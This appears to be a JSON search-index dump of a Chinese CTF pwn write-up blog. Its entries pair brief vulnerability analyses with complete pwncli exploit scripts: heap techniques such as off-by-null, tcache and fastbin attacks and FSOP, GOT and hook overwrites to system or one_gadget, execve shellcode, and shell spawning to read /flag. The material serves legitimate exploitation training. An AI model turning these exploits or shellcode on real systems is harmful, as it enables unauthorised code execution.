name_info(name=\"\", choose=1): p.sendlineafter(\"Your choice :\", \"4\") m = p.recvline_startswith(\"name : \") info(f\"Get info: {m}\") p.sendlineafter(\"Do you want to change the name? (yes:1 / no:0) \", str(choose)) if choose: read_name(name) return m # helpful to leak heap read_name(\"a\"*0x40) add(0x1e770) # get heap base m = name_info(choose=0) heap_base = u64_ex(m[0x47:]) - 0x260 log_heap_base_addr(heap_base) add(0xf8) edit(1, \"a\"*0xf8) edit(1, b\"a\"*0xf8+p16(0x521)) # free old top chunk add(0x600) edit(1, b\"a\"*0xf8+p16(0x2001)) # clear unsortedbin list and change new top chunk's size add(0x2000-0x10, flat({0x1b28:0x9f1})) # 3 # get a new unsorted bin chunk add(0x1000) # unsorted bin attack edit(3, flat({0x1b28:[0x9f1, 0, 0x602100-0x10]})) add(0x9e0) # leak libc addr m = name_info(flat(0, 0x20ff1)) libc_base = u64_ex(m[0x47:]) - 0x3ebca0 log_libc_base_addr(libc_base) libc.address = libc_base # change top-chunk ptr and repair the broken unsorted bin list edit(0, flat([0x6020c0, 0, libc_base + 0x3ebca0, libc_base + 0x3ebca0])) # change ptr---\u003eatol@got add(0x60, flat({0x30:[[elf.got.atol]*4]})) # change atol@got to system edit(1, p64(libc.sym.system)) # get shell p.sendline(\"/bin/sh\") # get flag get_flag_when_get_shell(p) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-10-24","objectID":"/zh-cn/2021-10-24-ciscn-2019-es-3/:0:0","tags":["pwn"],"title":"ciscn_2019_es_3","uri":"/zh-cn/2021-10-24-ciscn-2019-es-3/"},{"categories":["pwn-wp"],"content":"总结\r一道简单的tcache dup的题，前面需要绕过校验，注意一下函数的参数为int16。最后把shellcode处理一下即可。 Checksec\r版本为libc-2.27，无tcache dup检测。 漏洞点\r判断是否为0的函数的参数为int16。 uaf： EXP\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(size, data): p.sendlineafter(\"\u003e \", \"1\") p.sendlineafter(\"\u003e \", str(size)) p.sendafter(\"\u003e \", data) def dele(): p.sendlineafter(\"\u003e \", \"2\") p.sendafter(\"\u003e \", \"a\") p.sendlineafter(\"\u003e \", str(-2147483648)) # add add(0x20, 0x20*\"a\") dele() dele() add(0x20, \"\\x90\") add(0x20, \"a\"*0x20) add(0x20, \"The cake is a lie!\\x00\") p.sendlineafter(\"\u003e \", \"3\") payload = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\\x00\\x00\\x00\\x00\" pl = [1] ss = 1 for i in payload: ss ^= i pl.append(ss) p.sendlineafter(\"\u003e \", bytes(pl)) p.sendline(\"cat /flag\") p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-10-24","objectID":"/zh-cn/2021-10-24-ciscn-final-10/:0:0","tags":["pwn"],"title":"ciscn_final_10","uri":"/zh-cn/2021-10-24-ciscn-final-10/"},{"categories":["pwn-wp"],"content":"总结\r本题使用malopt(1, 0)禁用了fastbin，这种情况下，一般来说有两种解题思路： 方法一：首先unsortedbin attack攻击global_max_fast，然后利用fastbin attack完成利用 方法二：利用largebin attack或者有时候会利用house of storm进行任意地址分配 回到本题，由于申请的chunk size限制在了0x10 ~ 0x100之间，所以可以使用方法一，因此利用步骤为： off by null 泄露libc地址 unsortedbin attack打global_max_fast 0x70大小的fastbin attack，劫持__malloc_hook为one_gadget 题目分析\rChecksec\rlibc的版本为libc-2.23.so 漏洞点\r在update存在一个off by null： EXP\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(idx, size, data=\"deadbeef\", is_attack=False): p.sendlineafter(\"\u003e\u003e \", \"1\") p.sendlineafter(\"Index: \", str(idx)) p.sendlineafter(\"Size: \", str(size)) if not is_attack: p.sendafter(\"Content: \", data) def update(idx, data): p.sendlineafter(\"\u003e\u003e \", \"2\") p.sendlineafter(\"Index: \", str(idx)) p.sendafter(\"Content: \", data) def show(idx): p.sendlineafter(\"\u003e\u003e \", \"3\") p.sendlineafter(\"Index: \", str(idx)) p.recvuntil(\"content: \") m = p.recvline(0) info(f\"Get msg: {m}\") return m def dele(idx): p.sendlineafter(\"\u003e\u003e \", \"4\") p.sendlineafter(\"Index: \", str(idx)) \"\"\"procedure 1. off by null to leak 2. unsorted bin attack global_max_fast 2. fastbin attack \"\"\" add(0, 0x80) add(1, 0xf8) add(2, 0xf8) add(3, 0xf0) add(4, 0x10) # off by null dele(0) update(2, b\"a\"*0xf0 + p64(0x290)) # merge dele(3) # add add(0, 0x80) # leak m = show(1) libc_base = u64_ex(m) - 0x3c4b78 log_libc_base_addr(libc_base) libc.address = libc_base # house of orange add(3, 0x10) global_max_fast_off = 0x3c67f8 payload = flat({ 0x18:[0x71, 0, libc_base + global_max_fast_off-0x10], 0x80: [0, 0x21, 0, 0, 0, 0x21] }) update(1, payload) add(5, 0x60) # get a fastbin chunk dele(5) payload = flat({ 0x18:[0x71, libc.sym['__malloc_hook']-0x23] }) update(1, payload) add(5, 0x60) ags = get_current_one_gadget(libc_base) add(6, 0x60, flat([0x13*\"\\x00\", ags[2]])) # trigger malloc_hook to get shell dele(1) dele(3) get_flag_when_get_shell(p) p.interactive() 效果如下： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-10-23","objectID":"/zh-cn/2021-10-23-cscctf-2019-final-childrenheap/:0:0","tags":["pwn"],"title":"cscctf_2019_final_childrenheap","uri":"/zh-cn/2021-10-23-cscctf-2019-final-childrenheap/"},{"categories":["pwn-wp"],"content":"总结\rlibc-2.27版本下的off by null。 题目分析\rChecksec\r漏洞点\r在add分支，存在一个off by null，由strcpy导致的 利用思路\r步骤： 三明治结构，泄露地址 两个指针指向同一块chunk tcache dup修改__free_hook为one_gadget即可 EXP\rexp均使用pwncli编写，欢迎试用！ #!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(size, data=\"dead\"): p.sendlineafter(\"Your choice: \", \"1\") p.sendlineafter(\"Size:\", str(size)) p.sendafter(\"Data:\", data) def show(idx): p.sendlineafter(\"Your choice: \", \"2\") p.sendlineafter(\"Index:\", str(idx)) m = p.recvline(0) info(f\"get msg: {m}\") return m def dele(idx): p.sendlineafter(\"Your choice: \", \"3\") p.sendlineafter(\"Index:\", str(idx)) # libc-2.27 off by null add(0x420) # 0 add(0x80) # 1 add(0x4f0) # 2 add(0x10, \"/bin/sh\\x00\") # 3 dele(0) dele(1) add(0x88, \"a\"*0x88) # 0 dele(0) add(0x88, b\"a\"*0x80 + p64(0x4c0)) # 0 dele(2) add(0x420) # 1 m = show(0) libc_base = u64_ex(m) - 0x3ebca0 log_libc_base_addr(libc_base) libc.address = libc_base add(0x80) # 2 dele(0) dele(2) add(0x80, p64(libc.sym['__free_hook'])) add(0x80) add(0x80, p64(libc_base + list(get_current_one_gadget())[1])) dele(3) get_flag_when_get_shell(p) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-10-17","objectID":"/zh-cn/2021-10-17-ciscn-2019-sw-2/:0:0","tags":["pwn"],"title":"ciscn_2019_sw_2","uri":"/zh-cn/2021-10-17-ciscn-2019-sw-2/"},{"categories":["pwn-wp"],"content":"总结\r常规的libc-2.27版本下的off by null，PIE也没有开启。但是没有办法直接用bss上的堆指针去泄露和修改，所有还是选择了两个大的chunk进行unlink 题目分析\rChecksec\r漏洞点\r用户获取用户输入的函数存在off by null： 利用思路\r三明治结构，中间夹住一个0x80的存储有指针和长度和一个0x30存储content的chunk unlink，然后分配到0x80，修改指针为free@got和长度 泄露出libc地址，利用edit修改free@got为system 释放/bin/sh块获取shell EXP\rexp均使用我自己写的小工具pwncli编写，下面有链接，欢迎试用~ #!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(size, data=\"default\", name=\"lynne\"): if len(data) \u003c size: data += b\"\\n\" if isinstance(data, bytes) else \"\\n\" p.sendlineafter(\"\u003e\", \"1\") p.sendlineafter(\"please enter the name of the notebook:\", name) p.sendlineafter(\"please enter the length of the content:\", str(size)) p.sendafter(\"please enter the content:\", data) def edit(idx, data): p.sendlineafter(\"\u003e\", \"2\") p.sendlineafter(\"please enter the notebook id to edit:\", str(idx)) p.sendafter(\"please enter the content of the notebook:\", data) def show(idx): p.sendlineafter(\"\u003e\", \"3\") p.sendlineafter(\"please enter the notebook id to show:\", str(idx)) msg = p.recvlines(2) info(f\"Get msg: {msg}\") return msg def dele(idx): p.sendlineafter(\"\u003e\", \"4\") p.sendlineafter(\"please enter the notebook id to delete:\", str(idx)) \"\"\" libc-2.27 off by null -- malloc \"\"\" # unlink add(0x10) # 0 add(0x10) # 1 dele(0) add(0x420) # 0 add(0x28) # 2 dele(1) add(0x4f0) # 1 add(0x10, \"cat /flag||a\", \"cat /flag||a\") # 3 # off by null dele(0) edit(2, flat({0x20: 0x4f0})) dele(1) add(0x4b0, flat({0x4a0: [6, elf.got['free']]})) _, m = show(2) libc_base_addr = u64_ex(m[-6:]) - 0x97950 log_libc_base_addr(libc_base_addr) libc.address = libc_base_addr edit(2, p64(libc.sym.system)[:6]) dele(3) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-10-17","objectID":"/zh-cn/2021-10-17-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2018-%E5%B0%8F%E9%99%88%E7%9A%84%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%8A%A0%E5%BC%BA%E7%89%88/:0:0","tags":["pwn"],"title":"西湖论剑_2018_小陈的笔记本加强版","uri":"/zh-cn/2021-10-17-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2018-%E5%B0%8F%E9%99%88%E7%9A%84%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%8A%A0%E5%BC%BA%E7%89%88/"},{"categories":["pwn-wp"],"content":"总结\r10:30才起床做题……pwn是三道简单题，datasystem拿了个一血。hahapwn的远程靶机有问题，远程交互时惊现flag{flag_test}。我沉思片刻，随即怀着忐忑的心情点了提交，然而这个flag并不正确，有点迷。 datasystem: 堆溢出 + setcontext hehepwn：shellcode hahapwn：格式化字符串+栈溢出 Datasystem\r保护全开 系统调用禁得很佛系，arch也没检查，系统调用号范围也没检查： 给的libc版本是2.27，有tcache。 Check分析\r一进来有个check函数，要求输入username和passwd： 最后需要通过校验： 从上图也能看出username的校验是判断等不等于admin，这里循环次数是6，所以输入的时候后面带个\\x00才能通过username的校验。 passwd有点复杂，不过可以直接用ida远程调试，查看一下比较s1和s2的时候，其值为多少。先随便输入密码，比如我先输入为passwd为admin123，发现s2是一个16进制字符串： s1还看不出什么。然后我直接拷贝了s2作为密码输入： 然后发现s2的第1个字符变成了\\x00： 之后换别的密码，但是s2第一个字符始终不是\\x00。这个时候，我猜测是不是密码的长度要为32。于是分别输入32个a和32个b，发现s2的第一个字符始终为\\x00。 有这么一个规律后，接下来可以爆破passwd了，就是枚举爆破直到某次密码得到的s1开头也是\\x00，那么strcmp就能通过比较： 枚举所有的字符 输入32个同样的字符作为密码，判断是否通过校验 通过校验即可以作为有效的密码 爆破的脚本如下： import string from pwn import * context.log_level=\"error\" for c in range(0x100): c = c.to_bytes(1, 'big') p = process('./datasystem') p.sendafter(\"please input username: \", \"admin\\x00\") p.sendafter(\"please input password: \", c*32) msg = p.recvline() if b\"Fail\" not in msg: print('='*60) print(\"a valid char:\", c) print('='*60) p.close() 最后得到两个可以用的密码： 对check的分析即可告一段落，之后就是常规的堆溢出的题。 漏洞点\r在add分支，输入内容的时候，存在堆溢出，这的size总是0x506： 也可以用gdb看一把： 利用思路\r构造一个unsorted bin 利用chunk中fd与bk残留的的地址泄露出libc地址 利用堆溢出覆盖free chunk的fd为__free_hook - 0x200地址 分配到__free_hook - 0x200处，覆盖__free_hook为setcontext+53 利用程序mmap的0x23330000这一段rwx内存执行shellcode Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def login(): p.sendafter(\"please input username: \", \"admin\\x00\") p.sendafter(\"please input password: \", \"c\"*32) def add(size, data=\"a\\n\"): p.sendlineafter(\"\u003e\u003e :\\n\", \"1\") p.sendlineafter(\"Size: \\n\", str(size)) p.sendafter(\"what's your Content: \\n\", data) def delete(idx): p.sendlineafter(\"\u003e\u003e :\\n\", \"2\") p.sendlineafter(\"Index:\\n\", str(idx)) def show(idx): p.sendlineafter(\"\u003e\u003e :\\n\", \"3\") p.sendlineafter(\"Index:\\n\", str(idx)) m = p.recvline() info(f\"Get info:{m}\") return m def edit(idx, data): p.sendlineafter(\"\u003e\u003e :\\n\", \"4\") p.sendlineafter(\"Index:\\n\", str(idx)) p.sendafter(\"Content:\\n\", data) login() add(0x420) add(0x10) # 1 # get unsorted bin delete(0) # leak libc addr add(0x8, \"a\"*8) edit(0, \"a\"*8) m = show(0) libc_base_addr = u64_ex(m[0x11:0x17])- 0x3ec090 log_libc_base_addr(libc_base_addr) libc.address = libc_base_addr # overflow write add(0x20) # 2 delete(2) delete(0) add(0x10, flat({0x10:[0, 0x311, libc.sym['__free_hook']-0x200]})) add(0x20) # setcontext to exec shellcode payload = flat({ 0x200:libc.sym['setcontext']+53, 0x100: 0x23330000, # rsp 0xa0: libc.sym['__free_hook']-0x100 ,# rsp 0x68: 0, # rdi 0x70: 0x23330000, # rsi 0x88: 0x200, 0xa8: libc.sym['read'] # rcx }, filler=\"\\x00\") add(0x20, payload) delete(3) sleep(1) p.sendline(asm(shellcraft.cat(\"/flag\"))) p.interactive() 远程打： Hehepwn\r什么保护都没有，白给 漏洞点\r填满0x20个字符后可泄露栈地址： 栈溢出： Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] p.sendafter(\"well you input:\\n\", \"a\"*0x20) m = p.recvuntil(\"\\x7f\") addr = u64_ex(m[-6:]) log_address(\"stack addr\", addr) p.sendlineafter(\"EASY PWN PWN PWN~\\n\", flat({0:asm(shellcraft.cat('/flag')), 0x58: addr - 0x50})) p.interactive() 远程打： Hahapwn\r开启了NX和Canary，给的libc版本是2.23的： 强行禁用了execve： 漏洞点\r格式化字符串和栈溢出： 远程靶机很诡异啊，泄露出地址后，我用libc.sym['read']执行read会失败，但是用二进制文件的read@plt可以成功，还有pop rdx; pop rsi; ret远程也会失败，就很迷。后来改了下gadgets，然后喜提test flag： Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] libc: ELF = gift['libc'] # offset 6 p.sendafter(\"Welcome! What is your name?\\n\", \"%25$p,%27$p,%28$p\") m = p.recvline_startswith('0x') log_ex(f\"{m}\") leak_addr = int16(m[:14].decode()) - 324 - libc.sym['setvbuf'] log_libc_base_addr(leak_addr) libc.address = leak_addr canary = int16(m[15:33].decode()) log_address(\"canary\", canary) stack_addr = int16(m[34:48].decode()) log_address(\"stack\", stack_addr) start_addr = stack_addr - 0xc0 bss_addr = 0x601080 read_addr = 0x4005e0 puts_addr = 0x4005b0 libc_rdi_ret = leak_addr + 0x0000000000021112 libc_rdx_ret = leak_addr + 0x0000000000001b92 libc_rsi","date":"2021-09-25","objectID":"/zh-cn/2021-09-25-dasctf-sept-x-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/:0:0","tags":["pwn"],"title":"DASCTF-Sept-X-浙江工业大学秋季挑战赛-pwn-wp","uri":"/zh-cn/2021-09-25-dasctf-sept-x-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： read当长度为0的时候，会返回0 %s遇到\\0才会结束输出，遇到\\n并不会结束输出 某个地址存储了__free_hook的地址，搜一把就得到了 题目分析\rChecksec\r远程环境为libc-2.27.so 漏洞点\r主要在modify中，有一个打印地址和索引溢出 利用思路\r在buy函数中，会有一个置0的操作： 当时在这里卡了一段时间，后来发现，如果输入长度为0，就不会将chunk的fd某个字节置为0了，那么结合modify函数中的%s即可泄露出地址。 最后利用过程即为： 利用%s和read为0的第三个参数，泄露出libc的地址 修改索引为-2处的拿个地址为存储着__free_hook的地址 修改索引为-22的内容，就是修改__free_hook，修改为system 释放带有/bin/sh的块即可获取shell Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(data=\"a\\n\"): p.sendlineafter(\"EMMmmm, you will be a rich man!\\n\", \"1\") p.sendafter(\"I will give you $9999, but what's the currency type you want, RMB or Dollar?\\n\", data) def over(): p.sendlineafter(\"EMMmmm, you will be a rich man!\\n\", \"3\") def buy(length:int, data=\"a\\n\"): p.sendlineafter(\"Now, buy buy buy!\\n\", \"1\") p.sendlineafter(\"How long is your goods name?\\n\", str(length)) if length != 0: p.sendafter(\"What is your goods name?\\n\", data) def delete(idx:int): p.sendlineafter(\"Now, buy buy buy!\\n\", \"2\") p.sendlineafter(\"Which goods that you don't need?\\n\", str(idx)) def modify(idx:int, data=\"a\\n\"): p.sendlineafter(\"Now, buy buy buy!\\n\", \"3\") p.sendlineafter(\"Which goods you need to modify?\\n\", str(idx)) p.recvuntil(\"OK, what would you like to modify \") msg = p.recvline() p.send(data) info(\"msg recv: {}\".format(msg)) return msg def exp(): for i in range(20): add(\"a\" * 7) over() buy(0x500) # 0 buy(0x10, \"/bin/sh\\x00\\n\") # 1 # get unsorted bin delete(0) buy(0) # 2 # leak libc addr msg = modify(2) libc_base_addr = u64(msg[:6].ljust(8, b\"\\x00\")) - 0x3ec0d0 log_address(\"libc_base_addr\", libc_base_addr) # find the memory stores __free_hook address # use overflow index to change __free_hook's content to system modify(-2, p64(libc_base_addr + 0x3eaee8)[:7]) modify(-22, p64(libc_base_addr + libc.sym['system'])[:7]) # get shell delete(1) p.sendline(\"cat /flag\") p.interactive() exp() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-09-12","objectID":"/zh-cn/2021-09-12-hwb2018-shoppingcart/:0:0","tags":["pwn"],"title":"hwb2018_shoppingcart","uri":"/zh-cn/2021-09-12-hwb2018-shoppingcart/"},{"categories":["pwn-wp"],"content":"总结\r其实就是很简单的UAF的题目，只是结构体和分支比较复杂一点，所以逆向难度增加了。利用其实很简单。 题目分析\rChecksec\r远程环境为libc-2.23-so。 结构体\r主要涉及到两个结构体。一个是玩家信息的结构体： struct __attribute__((aligned(8))) User { char *name; uint64_t age; char descripe[256]; Message *msg_ptr; User *friend; uint64_t status; }; 一个是消息的结构体： struct Message { char *title; char *content; char *next_message; }; 漏洞点\r在manager_friend的分支，可以删除任意用户。但是删除该用户后，还能用该用户登录。 利用思路\r注册两个用户user1和user2 user1登录，然后添加user2为朋友，然后删除user2这个朋友 注册0x401816的用户，这样user2的名字就成了Done!，并且可以登录 登录user2，查看profile即可泄露出main_arena+88的地址 然后登录0x401816用户，修改username为atoi@got 再登录atoi_addr用户，然后update，修改atoi@got为system地址，再输入/bin/sh即可拿到shell Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def register(name_size:int, name:(str, bytes), age:int, desc:(str, bytes)=\"a\"): p.sendlineafter(\"Your choice:\", \"2\") p.sendlineafter(\"Input your name size:\", str(name_size)) p.sendafter(\"Input your name:\", name) p.sendlineafter(\"Input your age:\", str(age)) if age \u003e 17: p.sendafter(\"Input your description:\", desc) def login(user_name:(str, bytes)): p.sendlineafter(\"Your choice:\", \"1\") p.sendafter(\"Please input your user name:\", user_name) msg = p.recvline() info(\"Msg recv: {}\".format(msg)) return msg def view_profile(): p.sendlineafter(\"Your choice:\", \"1\") msg = p.recvlines(3) info(\"Msg recv: {}\".format(msg)) return msg def update_profile(user_name:(str, bytes), age:int, desc:(str, bytes)): p.sendlineafter(\"Your choice:\", \"2\") p.sendafter(\"Input your name:\", user_name) p.sendlineafter(\"Input your age:\", str(age)) p.sendafter(\"Input your description:\", desc) def add_delete_friend(add_delete:str, friend_name:(str, bytes)): p.sendlineafter(\"Your choice:\", \"3\") p.sendafter(\"Input the friend's name:\", friend_name) p.sendlineafter(\"So..Do u want to add or delete this friend?(a/d)\", add_delete) def send_message(friend_name:(str, bytes), title:(str, bytes), content:(str, bytes)): p.sendlineafter(\"Your choice:\", \"4\") p.sendafter(\"Which user do you want to send a msg to:\", friend_name) p.sendafter(\"Input your message title:\", title) p.sendafter(\"Input your content:\", content) def view_message(): p.sendlineafter(\"Your choice:\", \"5\") msg = p.recvuntil(\"1.view profile\\n\") info(\"Msg recv: {}\".format(msg)) return msg def logout(): p.sendlineafter(\"Your choice:\", \"6\") register(0x10, \"user1\", 16) register(0x10, \"user2\", 16) login(\"user1\\x00\") add_delete_friend('a', \"user2\\x00\") add_delete_friend('d', \"user2\\x00\") logout() register(0x128, p64(0x401816), 16) # stop() login(\"Done!\" + \"\\x00\") _, leak_addr, _1 = view_profile() libc_base_addr = int16(leak_addr[4:].decode()) - 0x3c4b78 log_address(\"libc_base_addr\", libc_base_addr) logout() login(p64(0x401816)) update_profile(p64(0x602060), 123, \"deadbeef\") logout() login(p64(libc_base_addr + libc.sym['atoi'])) p.sendlineafter(\"Your choice:\", \"2\") p.sendafter(\"Input your name:\", p64(libc_base_addr + libc.sym['system'])) p.sendafter(\"Input your description:\", \"/bin/sh\\x00\") p.sendline(\"/bin/sh\\x00\") p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-09-12","objectID":"/zh-cn/2021-09-12-wdb-2018-semifinal-pwn1/:0:0","tags":["pwn"],"title":"wdb_2018_semifinal_pwn1","uri":"/zh-cn/2021-09-12-wdb-2018-semifinal-pwn1/"},{"categories":["pwn-wp"],"content":"总结\r一道很无语的rop的题目，由于在puts调用中会卡在[ebp - 0x46c]这样的语句，所以只能把栈往抬高，避免访问到不可写的内存区域。 如果题目给的rop很短，那么需要想办法调用read写入更长的rop链 必要的时候需要把栈抬高，避免在函数调用过程中，让不可写的内存写入了东西，直接core dump call的时候会放置下一条指令到esp，但如果直接覆写了esp，那么还是可以继续劫持程序流 题目分析\rChecksec\r很久没碰到32位的题目了，环境为libc-2.27.so 函数分析\r最开始的时候，IDA无法识别函数。只需要在__printf_chk这个函数上按下Y，修改函数签名为int __printf_chk(int, const char*, ...);即可 流程很简单，先往bss段上写数据，然后有整数溢出和栈溢出： 刚开始以为是很简单的栈溢出，后来瞅了眼main函数退出的时候的汇编，发现栈直接被改变了： 这里的esp来自于ecx，而ecx可控。没有地址泄露，所以只能往bss段搞栈迁移。 所以一开始直接准备： puts泄露地址 重新执行main 再次rop执行system(/bin/sh)、 然而事情，并没有那么简单，在调用puts的时候，由于栈太低了，会往更低处的不可写的区域赋值，程序直接GG。然后想改成__printf_chk，也遇到了类似的问题。 所以只能找一下read函数，然后重新写一段长的rop，并把栈抬到高处，再进行泄露和利用。 在输入passwd长度的时候，只能写入0x10个字节。去掉要转化为负数的-1\\x00\\x00，只剩12个字节可以操作。如果直接rop，由于read有3个参数，所以至少需要0x14的大小，很显然这里不够。所以只能利用程序中的call read这样的汇编执令来缩小rop的长度。 我们必须要控制的参数有read的第二个和第三个参数，指明往bss段写和写的大小。那么第一个参数fd就没法控制，好在程序中就有，如下图： 有一个push 0，省了不少事情。 因此，最终的解题思路为： 将栈迁移到bss段 rop往buf区域写更长的rop 将栈抬高 执行puts泄露地址 再次执行read读入rop 执行system(/bin/sh) 这里还是不能回到main函数，还是会出现往非法内存区域写入的操作。索性直接再次读入rop，然后刚好esp也在bss段上，所以可控制执行system(/bin/sh) Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = ELF('libc-2.27-32bit.so') \"\"\" 输入负数即可绕过校验 之后进行rop \"\"\" buffer_addr = 0x0804A060 puts_addr = 0x8048490 puts_got_addr = 0x804A01C main_addr = 0x80486ea read_addr = 0x8048460 p.sendafter(\"Now, Challenger, What's name?\\n:\", \"aaaaaa\") p.sendafter(\"Please set the length of password: \", b\"-1\\x00\\x00\"+p32(0x8048793)+p32(buffer_addr)+p32(0xf00)) p.sendlineafter(\":\", flat(\"a\"*72, buffer_addr+8, # ecx 0, #ebx 0, # edi buffer_addr + 0xf00, # ebp )) sleep(1) payload = flat({ 0:[0x080487B3, buffer_addr+0x500, 0, 0, buffer_addr+0xf00], 0x500-4: [puts_addr, 0x08048431, puts_got_addr, read_addr, 0, 0, buffer_addr, 0xf00] }, filler=\"\\x00\") p.send(payload) msg = p.recvuntil(\"\\xf7\") libc_base_addr = u32(msg[-4:]) - libc.sym['puts'] log_libc_base_addr(libc_base_addr) libc.address = libc_base_addr sleep(1) p.send(flat(\"/bin/sh\\x00\", cyclic(0x4ec-8), libc.sym['system'], 0, buffer_addr)) p.interactive() 栈迁移： 泄露地址： 第二次read： 拿shell： 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-09-12","objectID":"/zh-cn/2021-09-12-ciscn-2019-ne-3/:0:0","tags":["pwn"],"title":"ciscn_2019_ne_3","uri":"/zh-cn/2021-09-12-ciscn-2019-ne-3/"},{"categories":["pwn-wp"],"content":"简要介绍\r发现在buu上做了很多ciscn-2019的题目，那直接搞个大合集。尽量收录所有的ciscn-2019-pwn的题目。 C系列\rCiscn-2019-C-7\r总结\r主要是限制了UAF的chunk的大小为0x20，并且限制了add的次数，就很难受，并且题目用的还是calloc，没有使用tcache。最后还是使用fastbin attack+unsortedbin attack + FSOP获取到的shell。 fastbin attack用于修改chunk size unsortedbin attack用于修改fast_global_max FSOP利用IO_str_finish拿shell 题目分析\rChecksec\r题目分析\r结构体\r逆向分析出Servent的结构体如下： struct Servent { char *name; uint64_t aggressivity; // 攻击力 }; 漏洞点\r漏洞1：recruite中的size可以为负数，下面做减法就会得到一个很大的正数，这样先把money搞到很大 漏洞2：expel分支 漏洞3：可以任意地址置为0，这个漏洞我没用到。但是隐约猜到了用处。 别的漏洞就没看到了。 利用过程\r利用漏洞1将money搞到很大 利用漏洞2，修改某个chunk的size，泄露出堆和libc地址 还是利用漏洞2，进行unsortedbin attack，打global_max_fast 释放一个很大的chunk，刚好覆盖掉_IO_list_all 利用FSOP拿shell Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def recruite(size:(tuple, list), name:(tuple, list)): p.sendlineafter(\"Give me your choice:\\n\", \"1\") p.sendlineafter(\"How many servents do you want to rescruit?\\n\", str(len(size))) for i in range(len(size)): p.sendlineafter(\"Input the name's size of this servent:\\n\", str(size[i])) p.sendafter(\"Input the name of this servent:\\n\", name[i]) def expel(idx:int): p.sendlineafter(\"Give me your choice:\\n\", \"2\") p.sendlineafter(\"Tell me his index number:\\n\", str(idx)) p.recvuntil(\"Ok, I'll kill \") msg = p.recvline() info(\"msg recv: {}\".format(msg)) return msg def buy_weapon(weapon_type:int): p.sendlineafter(\"Give me your choice:\\n\", \"3\") p.sendlineafter(\"2.Excalibur --90000yuan\\n\", str(weapon_type)) def attack_boss(use_big_weapon='n'): p.sendlineafter(\"Give me your choice:\\n\", \"4\") msg = p.recvline() if b\"Do you want to use excalibur?\" in msg: p.sendline(use_big_weapon) # 搞钱 p.sendlineafter(\"How much money do you want?\\n\", \"-1\") p.sendlineafter(\"Give me your choice:\\n\", \"1\") p.sendlineafter(\"How many servents do you want to rescruit?\\n\", str(-10000)) buy_weapon(2) # 为堆风水布局 recruite([0x18, 0x18, 0x18, 0x2000], [flat(0, 0x21), flat(0, 0x21), flat(0, 0x21), flat({0x400:[[0, 0x21, 0, 0] * 2], 0x1410:[[0, 0x21, 0, 0] * 2]})]) expel(1) expel(1) # 泄露堆地址 leak_addr = expel(1) heap_base_addr = u64(leak_addr[:6].ljust(8, b\"\\x00\")) - 0x2a0 log_address(\"heap_base_addr\", heap_base_addr) # fastbin attack for _ in range(5): expel(1) expel(0) expel(1) expel(0) recruite([0x18], [flat([0, 0x21, heap_base_addr + 0x280], length=0x18)]) # change size recruite([0x40, 0x18], [\"a\", flat(0, 0x71)]) for i in range(8): expel(1) # 改完size后得到一个大的chunk，释放它 expel(0) recruite([0x60], [flat({0:heap_base_addr + 0x2e0, 0x30: [0, 0x471]})]) expel(2) # 泄露libc地址 leak_addr = expel(1) libc_base_addr = u64(leak_addr[:6].ljust(8, b\"\\x00\")) - 0x3ebca0 log_address(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr expel(0) # unsortedbin attack global_max_fast_offset = 0x3ed940 recruite([0x60], [flat({0x30:[0, 0x471, 0, libc_base_addr + global_max_fast_offset - 0x10]}, filler=\"\\x00\")]) expel(0) str_jumps_offset = 0x3e8360 lock_offset = 0x3ed8c0 bin_sh_offset = 0x1b3e9a payload = flat({ 0x30: [0, 0x1441], 0x30+0x80: 0, 0x30+0x88: libc_base_addr + lock_offset, # lock 0x30+0xc0: 0, 0x30+0x28: 0xffffffffffffff, # write_ptr 0x30+0xd8: libc_base_addr + 